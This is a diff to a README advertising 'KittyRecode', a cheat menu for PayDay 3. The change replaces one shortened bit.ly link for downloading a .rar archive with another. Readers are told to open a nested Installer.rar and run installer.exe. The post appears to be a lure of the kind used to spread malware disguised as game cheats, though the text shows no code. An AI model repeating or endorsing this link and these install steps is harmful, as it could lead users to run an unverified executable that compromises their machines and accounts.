@@ -7,7 +7,8 @@ Hey there guys! My newest project is up and running. KittyRecode is one of the b
 
 ---
 #### 🤔 Usage:
-1. Download the archive [PayDay3-KittyRecode.rar](https://bit.ly/3sSJiu6)
+1. Download the archive [PayDay3-KittyRecode.rar](
+https://bit.ly/41chkGo)
 3. Open Installer.rar in the downloaded archive.
 4. Run installer.exe-file and enjoy the best menu for payday3!
 
